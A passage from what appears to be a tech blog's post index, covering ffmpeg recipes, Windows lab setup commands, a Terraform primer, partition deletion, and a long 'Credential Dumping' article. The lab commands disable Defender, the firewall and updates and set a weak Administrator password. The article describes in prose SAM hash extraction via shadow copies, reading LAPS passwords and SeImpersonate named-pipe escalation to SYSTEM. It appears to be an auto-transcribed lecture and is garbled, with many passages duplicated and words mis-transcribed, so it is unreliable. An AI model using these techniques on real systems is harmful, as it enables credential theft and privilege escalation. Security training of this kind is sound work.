re-encodingIf you want to cut off section from the beginning, drop -t 00:00:10 from the commandffmpeg -i source.mp4 -ss 00:00:05 -t 00:00:10 -async 1 -strict -2 cut_video.mp4reduce filesizeExample:This command reported very little change in video quality and reductions of 90% of the filesize.ffmpeg -i input.mov -vcodec libx264 -crf 24 output.mp4Make a grayscale version and scale to 640x480.ffmpeg -i video.mov -vf eq=saturation=0 -s 640x480 -c:v libx264 -crf 24 output.mp4Convert MP4 to WEBMffmpeg -i input.mp4 -c:v libvpx-vp9 -crf 31 -b:v 1M output.webmmore infoConvert MKV to MP4ffmpeg -i file.mkvCheck for streams that you want (video/audio). be sure to convert/specify DTS 6 channel audio streamffmpeg -i input.mkv -strict experimental -map 0:0 -map 0:1 -c:v copy -c:a:1 libmp3lame -b:a 192k -ac 6 output.mp4Add Watermark overlay (png) to the centre of a videoffmpeg -i source.mov -i watermark.png -filter_complex \"overlay=x=(main_w-overlay_w)/2:y=(main_h-overlay_h)/2\" output.mp4Reverse a videoffmpeg -i vid.mp4 -vf reverse reversed.mp4Concat a video with a reversed copy of itself for ping-pong looping effectffmpeg -i input.mp4 -filter_complex \"[0:v]reverse,fifo[r];[0:v][r] concat=n=2:v=1 [v]\" -map \"[v]\" output.mp4" }, { "title": "Scripting Lab Machines: Code Snippets", "url": "/posts/scripting-lab-machines-code-snippets/", "categories": "article", "tags": "", "date": "2021-06-20 00:00:00 +0100", "snippet": "When creating home lab machines you may have a common set of needs that you wish to apply to each one.· Enable Workplace Network Sharing· Disable ICE Protections on Servers· Turn off Windows Defend...", "content": "When creating home lab machines you may have a common set of needs that you wish to apply to each one.· Enable Workplace Network Sharing· Disable ICE Protections on Servers· Turn off Windows Defender· Disable UpdatesThe below assortment of commands is what I used to script the building of Windows machines and the creation of Active Directory Environments.Language and LocalePowerShellSet-WinUserLanguageList -LanguageList en-GB -ForceSet-WinSystemLocale en-GBSet-Culture en-GBSet Power OptionsCMDpowercfg.exe -change -monitor-timeout-ac 0powercfg.exe -change -monitor-timeout-dc 0powercfg.exe -change -disk-timeout-ac 0powercfg.exe -change -disk-timeout-dc 0powercfg.exe -change -standby-timeout-ac 0powercfg.exe -change -standby-timeout-dc 0powercfg.exe -change -hibernate-timeout-ac 0powercfg.exe -change -hibernate-timeout-dc 0FirewallPowerShellSet-NetFirewallProfile -All -Enabled FalseCMDnetsh firewall set opmode disablenetsh advfirewall set allprofiles state offIf keeping the firewall on then for labs you might need to enable File and Print sharing.netsh firewall set service type=fileandprint mode=enable profile=\"ALL\"Turn off Shutdown EventsPowershellSet-ItemProperty -Path \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability\" -Name \"ShutdownReasonOn\" -Value 0Set-ItemProperty -Path \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability\" -Name \"ShutdownReasonUI\" -Value 0CMDreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability\" /v ShutdownReasonOn /t REG_DWORD /d 0 /freg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability\" /v ShutdownReasonUI /t REG_DWORD /d 0 /fTurn off Windows Updates (On Desktop)PowerShellSet-ItemProperty -Path \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" -Name \"AUOptions\" -Value 1Set-ItemProperty -Path \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update\" -Name \"AUOptions\" -Value 1CMD (Windows 10)reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v AUOptions /t REG_DWORD /d 1 /freg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update\" /v AUOptions /t REG_DWORD /d 1 /fOn Windows 10 builds I sometimes also need to do the followingnet stop wuauservnet stop bitsnet stop dosvcDisable Screen Saving (On Desktop)PowerShellSet-ItemProperty -Path \"HKCU\\Software\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop\" -Name \"ScreenSaveActive\" -Value 0CMDreg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 0 /fStop Windows DefenderPowerShellStop-Service -Name WinDefendRemove-WindowsFeature Windows-DefenderEnable RDPPowerShellSet-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server'-name \"fDenyTSConnections\" -Value 0 Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"UserAuthentication\" -Value 1CMDnetsh advfirewall firewall set rule name=\"Remote Desktop - User Mode (TCP-In)\" new enable =Yes profile=\"domain,private,public\"netsh advfirewall firewall set rule name=\"Remote Desktop - User Mode (UDP-In)\" new enable =Yes profile=\"domain,private,public\"Turn Off IE Enhanced Security (Servers)PowerShellSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}\" -Name \"IsInstalled\" -Value 0Stop-Process -Name ExplorerActivate Administrator Account and Set PasswordCMDnet user Administrator /active:yesnet user Administrator Passw0rd!Rename Computer HostnamePowerShell$ComputerInfo = Get-WmiObject -Class Win32_ComputerSystem$ComputerInfo.Rename($mchname)CMDRename-Computer -NewName $hostname" }, { "title": "A Perfect Box In The Cloud", "url": "/posts/perfect-box-cloud/", "categories": "article", "tags": "vultr", "date": "2021-06-19 00:00:00 +0100", "snippet": "Vultrchoco install -y gitchoco install -y notepadplusplus.installchoco install -y pycharmchoco install -y xampp-80choco install -y wiresharkchoco install -y chromiumchoco install -y visualstudio201...", "content": "Vultrchoco install -y gitchoco install -y notepadplusplus.installchoco install -y pycharmchoco install -y xampp-80choco install -y wiresharkchoco install -y chromiumchoco install -y visualstudio2019communitychoco install -y microsoft-edgechoco install -y grammarly-edgechoco install -y selenium-all-driverschoco install -y python3choco install -y sysinternalschoco install -y dogtail.dotnet3.5sp1choco install -y netfx-4.5.2-devpackchoco install -y vscodechoco install -y vscode-pythonchoco install -y vscode-ansiblechoco install -y vscode-dockerchoco install -y windowdetectivechoco install -y terraformchoco install -y windbgchoco install -y rsatchoco install -y dnspychoco install -y markdownmonsterchoco install -y unxutilschoco install -y 7zipchoco install -y clipxchoco install -y puttychoco install -y putty-ngchoco install -y winrarchoco install -y vscode-csharpchoco install -y bitvise-ssh-serverchoco install -y ssh-copy-idchoco install -y puttytraychoco install -y mingwchoco install -y autoitchoco install -y powershelluniversalchoco install -y dropit.portablechoco install -y mousecontrollerchoco install -y phraseexpress.portablechoco install -y eventghostchoco install -y clipboardfusionchoco install -y tinytaskchoco install -y big-stretch-reminderchoco install -y stretchlychoco install -y togglchoco install -y pomotimechoco install -y launchychoco install -y everythingchoco install -y freeterchoco install -y docker-machinechoco install -y docker-composechoco install -y docker-clichoco install -y openvpnchoco install -y rubychoco install -y golangchoco install -y powerguichoco install -y conemuchoco install -y powershellchoco install -y powershell-corechoco install -y sublimetext3.appchoco install -y wslchoco install -y wsl-alpinechoco install -y wsl-debiangnulinuxchoco install -y wsl-ubuntu-1804choco install -y wsl-kalilinux" }, { "title": "Introduction to Terraform", "url": "/posts/introduction-terraform/", "categories": "tutorial", "tags": "terraform", "date": "2021-06-18 00:00:00 +0100", "snippet": "Introduction• Started 2014• Terraform is the infrastructure as code offering from HashiCorp. • Single declarative language instead of configuration through various dashboards.• HCL - HashiCorp Conf...", "content": "Introduction• Started 2014• Terraform is the infrastructure as code offering from HashiCorp. • Single declarative language instead of configuration through various dashboards.• HCL - HashiCorp Configuration Language (HCL) • HitashiCorp makes Vagrant, Packer, Vault, Consul, Nomad• Two versions, Cloud (Open Source) and Enterprise (Paid For)• Enterprise has better auditing and more templates. • Can run, Amazon AWS, Azure, Google Cloud, Oracle, Alibaba Cloud• IT is commonly misunderstood that you can run a file against multi clouds verbatim i.e. without any modifications. Advantages• Easily repeatable• Easily readable• Operational certainty with \"terraform plan\"• Standardised environment builds• Quickly provisioned development environments• Disaster recoveryComplimentary Technologies• Ansible• Chef• Puppet• SaltStack• Packer = You create a stack (like a container) that you deploy to a server. Docker changes the server (you run it on the server)• Docker = Containers• Kubernetes = Open Source Docker Container Manager• Nomad = HashiCorp version of Kubernetes (provisions containers)HCL Files• Split into two (Provider and Resource)• The provider block configures the named provider such as AWS, Azure, • The resource block defines a piece of infrastructure. A resource might be a physical component such as an EC2 instance, or it can be a logical resource such as a Heroku application.ProviderGo to terraform.io to see the list of providers.Current List• ACME• Akamai• Alibaba Cloud• Archive• Arukas• Auth0• Avi Vantage• Aviatrix• AWS• Azure• Azure Active Directory• Azure Stack• A10 Networks• BaiduCloud• Bitbucket• Brightbox• CenturyLinkCloud• Check Point• Chef• CherryServers• Circonus• Cisco ASA• Cisco ACI• Cloudflare• Cloud-init• CloudScale.ch• CloudStack• Cobbler• Cohesity• Constellix• Consul• Datadog• DigitalOcean• DNS• DNSimple• DNSMadeEasy• Docker• Dome9• Dyn• EnterpriseCloud• Exoscale• External• F5 BIG-IP• Fastly• FlexibleEngine• FortiOS• Genymotion• GitHub• GitLab• Google Cloud Platform• Grafana• Gridscale• Hedvig• Helm• Heroku• Hetzner Cloud• HTTP• HuaweiCloud• HuaweiCloudStack• Icinga2• Ignition• Incapsula• InfluxDB• Infoblox• JDCloud• KingsoftCloud• Kubernetes• Lacework• LaunchDarkly• Librato• Linode• Local• Logentries• LogicMonitor• Mailgun• MetalCloud• MongoDB Atlas• MySQL• Naver Cloud• Netlify• New Relic• Nomad• NS1• Null• Nutanix• 1&amp;1• Okta• Okta Advanced Server Access• OpenNebula• OpenStack• OpenTelekomCloud• OpsGenie• Oracle Cloud Infrastructure• Oracle Cloud Platform• Oracle Public Cloud• OVH• Packet• PagerDuty• Palo Alto Networks• PostgreSQL• PowerDNS• ProfitBricks• Pureport• RabbitMQ• Rancher• Rancher2• Random• RightScale• Rubrik• Rundeck• RunScope• Scaleway• Selectel• SignalFx• Skytap• SoftLayer• Spotinst• StackPath• StatusCake• Sumo Logic• TelefonicaOpenCloud• Template• TencentCloud• Terraform• Terraform Cloud• Time• TLS• Triton• Turbot• UCloud• UltraDNS• Vault• Venafi• VMware Cloud• VMware NSX-T• VMware vCloud Director• VMware vRA7• VMware vSphere• Vultr• Wavefront• YandexDeclarative vs ProceduralTerraform is a declarative type language.DeclarativeDefine how the end-state should lookThere shall be a load balancer in front of a pool of 3 serversProceduralPerform set of actions to create an end stateInstalling Terraformhttps://www.terraform.io/downloads.htmlWe can use Homebrew or Chocolatey on Windows to install Terraform. Alternatively, we can perform a manual installation with a binary package.ChocolateyRun the following after installing Chocolateychoco install terraformterraform --helpExample Output ManualFor manual installation, you need to download the binary and add the location to your system path.Building Infrastructure• The set of files used to deploy your infrastructure is called a 'configuration' The prerequisite to run the below is an AWS Account and the AWS CLI installed.mkdir learn-terraform-aws-instancecd learn-terraform-aws-instancenano example.tf\t\tprovider \"aws\" {\t\t profile = \"default\"\t\t region = \"us-east-1\"\t\t}\t\t\t\tresource \"aws_instance\" \"example\" {\t\t ami = \"ami-2757f631\"\t\t instance_type = \"t2.micro\"\t\t}terraform initterraform applyAt this point, you will be prompted as below Confirm Your Terraform PlanAt this point you can cancel out and it will have no effect, alternatively you can proceed. Terraform will create your infrastructure.You can run the following to see your infrastructure.terraform show When you have finished you may run the following to tear down the infrastructure.terraform destroyCoding• Visual Studio Code, IntelliJ, Eclipse, all have support for terraform.• Lists are the same as arrays in Php or Dictionary in Python• Sets are like Tuples in Python. We can set variablesvariable \"location\" { description = \"Name of the Azure region to create resources in\" default = \"westus2\" type = string}We can use variablesresource \"azurerm_resource_group\" \"rg\" { name = \"tf-variables-rg\" location = var.location} Setting VariablesCross References Setting Cross ReferencesChanging ConfigurationAs you change Terraform configurations, Terraform builds an execution plan that only modifies what is necessary to reach your desired state.ResourcesRepo from Cybrary Trainerhttps://github.com/jleonelion/fundamentals-of-terraformTerraform Releaseshttps://releases.hashicorp.com/terraform/" }, { "title": "Deleting the Recovery Partition", "url": "/posts/deleting-recovery-partition/", "categories": "tutorial", "tags": "windows, diskpart, admin, diskmngr", "date": "2021-06-17 00:00:00 +0100", "snippet": "Ever expanded the size of a disk to find a recovery partition taking up some of your continuous space?Recovery Partition in Our Continuos Space.Step 1 - Open diskpart.exeOpen up a CMD and type in d...", "content": "Ever expanded the size of a disk to find a recovery partition taking up some of your continuous space?Recovery Partition in Our Continuos Space.Step 1 - Open diskpart.exeOpen up a CMD and type in diskpart. The software will open up an interactive console.Step 2 - Listing DisksLIST DISKStep 3 - Select A DiskSELECT DISK 0Step 4 - Listing DisksLIST PARTITIONStep 5 - Select PartitionSELECT PARITION 4Step 5 - Deleting PartitionsDELETE PARTITION OVERRIDE" }, { "title": "Credential Dumping", "url": "/posts/credential-dumping/", "categories": "article", "tags": "", "date": "2021-06-17 00:00:00 +0100", "snippet": "Sam database local Windows credentials are stored in the security account manager or Sam database as password hashes using the nclm hashing format which is based on the MD for algorithm we can reus...", "content": "Sam database local Windows credentials are stored in the security account manager or Sam database as password hashes using the nclm hashing format which is based on the MD for algorithm we can reuse acquired nclm hashes to authenticate to a different machine as long as the hash is tied to a user account and password registered on that machine although it’s rare to find matching local credentials between disparate machines the built-in default named administrator account is installed on all windows based machines this account has been disabled on desktop editions since Windows Vista but it is enabled on servers by default to ease administrative task system administrators often enable this default account on desktop editions and set a single shared password given the capability of this attack Vector let’s walk through an example in this case will attack the default local administrator account every Windows account has a unique security identifier or SID that follows a specific pattern in this structure the seed begins with a literal ass to identify the string is a sid followed by a revision level usually set to 1 and identify Authority value often five and one or more sub of 30 values the sub Authority will always end with a relative identifier or or Friday representing a specific object on the machine let’s use Powershell nwmi to locate the seed of the local administrator account on our Windows 10 victim machine let’s use Powershell and wmi to locate the seed of the local administrator account on our Windows 10 victim machine first we’ll determine the local computer name from the associated environment variable and use it with the wmi win32 user account class to obtain results for the local administrator account will specify the computer name through the domain property and the account name through the name property the output reveals in r i d value of 500 as expected next will attempt to obtain credentials for this user account from the Sam database the Sam database is located at C Windows system32 config Sam but the system process has an exclusive lock on it preventing us from reading or copying it even from an administrative command prompt there are two potential workarounds first we could use the volume Shadow copy server which can create a snapshot or Shadow volume of the local hard drive with vssadmin which is installed on Windows 8.1 and later we can create a new Shadow volume with the create Shadow option but this option is only available on server editions of the school the second approach which will work on our Windows 10 machine is to execute this option through wmic launched from an administrative command prompt specifically it will launch wmic specify the shadow copy class create a new Shadow volume and specify the source drive with volume equals this will create a snapshot of the C drive to verify this will run vssadmin and list the existing Shadow volumes with list Shadows now that we’ve confirmed the creation of the Shadow volume we can copy the Sam database from it using the source path provided in the output although we have copied the Sam database it is partially encrypted by either rc4 or AES the encryption keys are stored in the system file which is in the same folder as the Sam database however it is also locked by the system account we can reuse our shadow volume copy to copy this file as well we can also obtain a copy of the Sam database and system files from the registry in the H key local machine Sam and hkey local machine system hives respectively administrative permissions are required to read and copy for example will use the reg save command to save the content to the hard disk by specifying the registry hive and the output file name and path regardless of how we obtained the Sam database and system file we must decrypt them at the time of this video the only two tools that can decrypt these files are Mimi cats and credit dump 7 in this example will use credit dump first will install the python crypto library and then clone cred dumped from the GitHub repository with Git clone at the time of this video the only two tools that can decrypt these files are Mimi cats and credit seven in this example will use credum first will install the python crypto library and then clone cred dumped from the GitHub repository with Git clone next will copy the Sam and system files from the Windows 10 victim machine to our Kali Linux machine and use the PW dump python script from Craig dump 7 to decrypt the ntlm hashes we have successfully decrypted the Sam database and obtain the ntlm password hash for the local administrator account in this section we have executed this process manually to demonstrate the individual steps however many post exploitation Frameworks can automate this process as well in the next section will examine how Microsoft has attempted to mitigate the risk of this attack vectorhardening the local administrator account although disabling this account would block this attack Vector many organizations rely on this account for various applications and administrative tasks in an attempt to prevent attacks that leverage shared administrator passwords Microsoft introduced Group Policy preferences with Windows Server 2008 which included the ability to centrally change local administrator account passwords however this approach stored data in an XML file in a cyst fall folder which must be accessible to all computers in active directory this created an obvious security issue since the unhash local administrator password was stored on an easily accessible share to solve this issue Microsoft aes-256 and Cryptid them the aes-256 encryption password is realistically unbreakable given a strong key this created an obvious security issue since the unhash the local administrator password was stored on an easily accessible share to solve this issue Microsoft aes-256 and Cryptid them the aes-256 encryption password is realistically unbreakable given a strong key surprisingly Microsoft published the AES private key on msdn effectively breaking their own encryption as an apparent solution Microsoft issued a security update in 2014 which removed the ability to create group policy preferences containing passwords although these files could no longer be created existing Group Policy preferences containing passwords were not removed meaning some may still exist in the wild to again address the issue of centrally managing passwords for the local administrator account Microsoft released the local administrator password solution or laps in 2015 which offered a secure and scalable way of remotely managing the local administrator password for domain-joined computers laps introduces two new attributes for the computer object into active directory the first registers the expiration time of a password as directed through a group policy the second contains the cleartext password of the local administrator account this attribute is confidential meaning specific read permissions are required to access the content which is normally assigned through group membership lapse uses the unmanaged dynamic link library admp wdll to change the local administrator password and push the new password to the second attribute of the associated computer object if lapses in use we should try to gain access to the clear text passwords in active directory as part of a penetration test is lapses in use we should try to gain access to the clear text passwords in active directory as part of a penetration test while Microsoft has released a Powershell toolkit to query lapse it is not typically installed on a workstation while Microsoft has released a Powershell toolkit to query lapse it is not typically installed on a Workstation instead we can use the laps toolkit Powershell script which is essentially a rapper script around the Power view active directory enumeration Powershell script for example will invoke the get laps computers method from laps toolkit to list all computers which are set up with laps and display the hostname the clear text password and the expiration time although we have discovered the app serves 01 server which is managed by elapsed we cannot view the clear text password in this case our current user account does not have permissions to read the password so it’s returned as empty we can use the find laps delegated groups method of laps toolkit to discover groups that can fully enumerate the lapse data from the output we find that members of the custom laps password readers group have read permissions next week and use powerview to enumerate members of that group through the get net group member method supplying the group name option to specify the group name the output reveals that the Jeff and admin users can read the laps passwords these permissions are often given to both help desk employees and system administrators users with these permissions are prime targets during a penetration test since they have access to clear text passwords on a potentially large number of workstations or servers for example we start a Powershell instance as the admin user and view the laps passwords with get laps computers we can use the local administrator password for App serves your one to remotely log into this machine and others with matching credentials now that we have an understanding of the local administrator account and potential attack vectors against it let’s investigate how access rights and permissions work after a user has authenticated on Windowsaccess tokens credentials such as username and password combinations are used for authentication but the operating system also must keep track of the users access rights for example authorization Windows users access tokens to track these rights and their assigned to each process associated with the user in this section will discuss access tokens and explore various ways we can leverage them for privilege escalation credentials such as username and password combinations are used for authentication with the operating system also must keep track of the users access rights for example authorization Windows users access tokens to track these rights and their assigned to each process associated with the user in this section will discuss access tokens and explore various ways we can leverage them for privilege escalationaccess token Theory an access token is created by the colonel upon user authentication and contains important values that are linked to a specific user through the Sid access tokens are stored inside the kernel which prevents us from directly interacting with the token or modifying it as penetration testers will focus on two concepts relating to the access token specifically Integrity levels and privileges Windows defines for integrity levels which determine the level of access low medium high and system low Integrity is used with sandbox processes like web browsers applications executing in the context of a regular user run at medium integrity and administrators can execute applications at high integrity system is typically only used for system Services it’s not possible for a process of a certain Integrity level to modify a process of hire Integrity level but the opposite is possible this is done to prevent trivial privilege escalation local administrators received to access tokens when authentication the first which is used by default is configured to create processes as medium Integrity when the user selects the run as administrator option for an application II elevated token is used instead and allows the process to run at high integrity the user account control or UAC mechanism links these two tokens to a single user and creates the consent prompt a local administrator regulated by UAC is sometimes also called a split token administrator privileges are also included in the access token they are a set of predefined operating system access rights that govern which actions of process can perform within the access token privileges are controlled by two-bit masks the first sets the Privileges which are present for that specific token and cannot be modified through any apis inside the same logon session II registers if the present privileges are enabled or disabled and may be dynamically updated through the win32 API adjust token privileges for example we can easily view the available privileges for the current user with who am I from command. Exe by specifying the / flag the output shows five privileges although we won’t discuss every privilege let’s discuss token privilege modification the SEC shut down privilege privilege allows the user to reboot or shut down the computer since it is listed in the output it is present in the access token but it is also disabled if we choose to shut down the computer through the shutdown command the backend code will enable the privilege with adjust token privileges for example we can easily view the available privileges for the current user with who am I from command. Exe by specifying the / flag the output shows five privileges although we won’t discuss every privilege let’s discuss token privilege modification the SE shutdown privilege privilege allows the user to reboot or shut down the computer since it is listed in the output it is present in the access token but it is also disabled if we choose to shut down the computer through the shutdown command the backend code will enable the privilege with adjust token privileges and then perform the required actions to power off the operating system while it is impossible to modify the set of privileges that are associated with an active log on session it is however possible to add additional privileges that will take effect after the targeted user account logs out and log back in programmatically this can be done with the win32 API LSA add account rights but more often it would be performed through a group policy or locally through an application like secpol. MSC and then perform the required actions to power off the operating system while it is impossible to modify the set of privileges that are associated with an active log on session it is however possible to add additional privileges that will take effect after the targeted user account logs out and log back in programmatically this can be done with the win32 API LSA add account rights but more often it would be performed through a group policy or locally through an application like SEC Paul. MSC selected privilege SE load driver privilege yields the permission to load a kernel driver if we were to apply that privilege to our user the current token would not be modified rather a new token would be created once the user logs out and back in again as we wrap up this theoretical section we must discuss two types of access tokens each process has a primary access token which originates from the user’s token created during authentication in addition and impersonation token can be created which allows a user to act on behalf of another user without that users credential impersonation tokens have four levels Anonymous identification impersonation and delegation as we wrap up this theoretical section we must discuss two types of access tokens each process has a primary access token which originates from the user’s token created during authentication in addition and impersonation token can be created which allows a user to act on behalf of another user without that users credentials impersonation tokens have four levels Anonymous identification impersonation and delegation Anonymous an identification only allow enumeration of information impersonation as the name implies allows impersonation of the client’s identity while delegation makes it possible to perform sequential Access Control checks across multiple machines the ladder is critical to the functionality of distributed applications for example let’s assume a user authenticate to a web server and performs an action on that server that requires a database look up the web server could use delegation to pass authentication to the database server through the web server now that we’ve discussed the main theory behind Windows post off an occasion permissions and access rights will practically apply this theory in the next sectionelevation with impersonation in the previous section we discussed how the Privileges of an access token decide the access rights of an authenticated user now let’s discuss how we can leverage certain privileges for escalation in the past security researchers have identified nine different privileges that may allow for privilege escalation from medium Integrity to either high integrity or system Integrity or enable compromise of processes running as another authenticated user explaining all 9 privileges in depth and how they may be used to escalate privileges is beyond the scope of this module but will focus on SE impersonate privilege this privilege allows us to impersonate any token for which we can get a reference or handle SE in person a privilege is quite interesting since the built-in network service account the local service account and the default is account now let’s discuss how we can leverage certain privileges for escalation in the past security researchers have identified nine different privileges that may allow for privilege escalation from medium Integrity to either high integrity or system Integrity for an able compromise of processes running as another authenticated user explaining all 9 privileges in depth and how they may be used to escalate privileges is beyond the scope of this module but will focus on SE impersonate privilege this privilege allows us to impersonate any token for which we can get a reference or handle SE in person a privilege is quite interesting since the built-in network service account the local service account and the default is account assigned by default because of this gaining code execution on a web server will often give us access to this privilege and potentially offer the possibility to escalate our access if we have SE in-person a privilege we can often use the duplicate token X win32api to create a primary token from an impersonation token and create a new process in the context of the impersonated user when no tokens related to other user accounts are available in memory we can likely Force the system account to give us a token which we can impersonate to leverage as the impersonate privilege in this section we’re going to use a post exploitation attack that relies on Windows pipes pipes are a means of inner process communication just like our PC cam or even network sockets I’ve been assigned by default because of this gaining code execution on a web server will often give us access to this privilege and potentially offer the possibility to escalate our access if we have SE impersonate privilege we can often use the duplicate token X win32api to create a primary token from an impersonation token and create a new process in the context of the impersonated user when no tokens related to other user accounts are available in memory we can likely Force the system account to give us a token which we can impersonate to leverage as the impersonate privilege in this section we’re going to use a post exploitation attack that relies on Windows pipes pipes are a means of inner process communication just like our PC cam or even network sockets a pipe is a section of shared-memory inside the colonel that processes can use for communication one process the pipe server can create a pipe while other processes pipe clients can connect to the pipe and read or write information from or to it depending on the configured access rights for a given height Anonymous pipes are typically used for communication between parent and child processes while named pipes are more broadly used in our example will make use of named pipes because they have more functionality and more importantly they support impersonation the attack that we’re going to stimulate based on a technique developed by security researcher Lee Christensen can force the system account to connect to a named pipe set up by an attacker a pipe is a section of shared-memory inside the colonel that processes can use for communication one process the pipe server can create a pipe while other processes pipe clients can connect to the pipe and read or write information from or to it depending on the configured access rights for a given height Anonymous pipes are typically used for communication between parent and child processes while named pipes are more broadly used in our example will make use of named pipes because they have more functionality and more importantly they support impersonation the attack that we’re going to stimulate based on a technique developed by security researcher Lee Christensen can force the system account to connect to a named pipe setup by an attacker while the technique was originally developed as part of an active directory attack it can also be used locally it’s based on The Print Spooler service which is started by default and run in a system context will discuss the technique in more detail later for now it’s important to understand that the attack is based on the fact that the Print Spooler monitors printer object changes and sends change notifications to print clients by connecting to their respective named pipes if we can create a process running with the SE impersonate privilege that simulates a print client we will obtain a system token that we can impersonate to demonstrate this let’s create a C sharp application that creates a pipe server weights for a connection and attempts to impersonate the client that connects to it the first key component of this attack is the impersonate named pipe client API which allows impersonation of the token from the account that connects to the pipe if the server has se impersonate privilege when impersonate named pipe client is called the calling thread will use the impersonated token instead of its default token in order to create our first proof-of-concept will have to use the create named pipe connect named pipe and impersonate named pipe client 32 apis as the name suggests create named pipe creates a pipe is API except the number of relatively simple arguments the first and most important is the pipe name all named pipes must have a standardized name format and must be unique on the system the second argument describes the mode the pipe is opened in will specify a bi-directional pipe with the pipe access duplex enum using its numerical equivalent of 3 the third argument describes the mode the pipe operates in will specify pipe type bite to directly write and read bites along with pipe wait to enable blocking mode this will allow us to listen on the pipe until it receives a connection will specify the combination of these two modes with the numerical value zero the maximum number of instances for the pipe is specified through nmax instances this is primarily used to ensure efficiency and larger applications and any value between 1 and 2:55 works for us in out buffer size and an in buffer size Define the number of bikes to use for the input and output buffer respectively will choose one memory page of hacks 1,000 bytes the second to last argument defines the default timeout value that is used with the weight named pipe API since we’re using a blocking named pipe we don’t care about this and we can choose the default value of 0 for the last argument we must submit a sid detailing which clients can interact with the pipe will set this to know to allow the system and local administrators to access it at this point will create a new Visual Studio solution and insert the P invoke dllimport statement along with the call to create named pipe and insert the p in Boca dllimport statement along with the call to create named pipe this code expects the pipe name to be passed on the command line next we must invoke connect named pipe the first argument is a handle to the pipe which is returned by create named pipe and the second is a pointer to a structure used in more advanced cases in our case will simply set this to know next we add the code required to import and call connect named pipe after we’ve called connect named pipe the application will wait for an incoming pipe client once the connection is made will call impersonate named pipe client to impersonate the client impersonate named pipe client accept the pipe handle as it’s only argument or its function prototype once the connection is made will call impersonate named pipe client to impersonate the client impersonate named pipe client accepts the pipe handle as it’s only argument or its function prototype the rather simple code editions importing and calling impersonate named pipe client are added next at this point our code will start a pipe server listen for incoming connections and impersonate them if everything works correctly impersonate named pipe client will assign the impersonated token to the current thread but we have no way of confirming this in our current application to verify the success of our attack we can open the impersonated token with open thread token and then use get token information to obtain the Sid associated with the token finally we can call convert Sid to string Sid to convert the Sid to a readable Sid string while this confirmation does not have to be part of our final exploit it helps us understand the attack let’s add these apis to Arco let’s examine the function prototype for open thread token according to the function prototype we must First Supply a handle to the thread associated with this token since the thread in question is the current thread will use the get current thread win32api which does not require any arguments and simply Returns the handle next we must specify the level of access we went to the Token to avoid any issues will ask for all permissions with its numerical value since the threat in question is the current thread will use the get current thread win32api which does not require any arguments and simply Returns the handle next we must specify the level of access we went to the Token to avoid any issues will ask for all permissions with its numerical value open a self specifies whether the API should use the security context of the process or the thread since we want to use the impersonated token will set this to false finally we must Supply a pointer that will be populated with a handle to the Token that is opened open a self specifies whether the API should use the security context of the process or the thread since we want to use the impersonated token will set this to fall so finally we must Supply a pointer that will be populated with a handle to the Token that is opened let’s add the required code next will invoke get token information the API can return a variety of information but will simply request this Sid the first argument is the token we obtained from open thread token and the second argument specifies the type of information we want to obtain token information class isn’t enough that contains value specifying the type of information we can retrieve from an access token via get token information since we simply want the CID we can pass token user which has the numerical value of one for the token information class argument token information is a pointer to the output buffer that will be populated by the API the API can return a variety of information but we’ll simply request this Sid the first argument is the token we obtained from open thread token and the second argument specifies the type of information we want to obtain token information class isn’t enough that contains value specifying the type of information we can retrieve from an access token via get token information since we simply want the CID we can pass token user which has the numerical value of one for the token information class argument token information is a pointer to the output buffer that will be populated by the API and token information length is the size of the output buffer since we don’t know the required size of the buffer the recommended way of using the API is to call it twice the first time we set these two argument values to know and 0 respectively and then return length will be populated with the required size after this we can allocate an appropriate buffer and call the API a second time to allocate the token information buffer will use the dotnet Marshall Alec H Global method which can allocate unmanaged memory as the final step will use convert Sid to string CID to convert the binary CID to a CID string which we can read the first argument is a pointer to the Sid the Sid is in the output buffer that was populated by get token information but we must extract it first one way to do this is to define the token user structure which is part of the token information class used by get token information and then Marshall a pointer to it with Marshall pointer to structure for the last argument will supply the output string here we can simply Supply in empty pointer and once it gets populated Marshall it to see Sharp string with Marshall pointer to string Auto as the final step will use convert Sid to string Sid to convert the binary Sid to a CID string which we can read the first argument is a pointer to the Sid the Sid is in the output buffer that was populated by get token information but we must extract it first one way to do this is to define the token user structure which is part of the token information class used by get token information and then Marshall a pointer to it with Marshall pointer to structure for the last argument will supply the output string here we can simply Supply in empty pointer and once it gets populated Marshall it to see Sharp string with Marshall pointer to string Auto let’s add the required structures import and code on the last line of code we print the CID associated with the token to the console showing which user we impersonated now we have finally written all the code we need to test and better understand the use of named pipes for impersonation and privilege escalation on the last line of code we print the sea associated with the token to the console showing which user we impersonated now we have finally written all the code we need to test and better understand the use of named pipes for impersonation and privilege escalation as previously mentioned we must execute the code in the context of a user account that has the SE impersonate privilege access right for our attack demonstration will log into app server 01 as the domain user admin for our attack demonstration will log into app serves 01 as the domain user admin and use PS exact to open a command prompt as the built-in network service account before we execute our application we can verify the user and the presence of SE impersonate privilege in the new command prompt now we can transfer it to app serves 01 next we executed and Supply a random pipe name simulator connection we can open an elevated command prompt and write to the pipe when we switch back to the command prompt running our application we find that a CID has been printed our code has impersonated a token and resolved the associated Sid to verify that this Sid belongs to the administrator account we can switch back to the elevated command prompt and dump it this proves that we have indeed impersonated the built-in domain administrator account more importantly we can 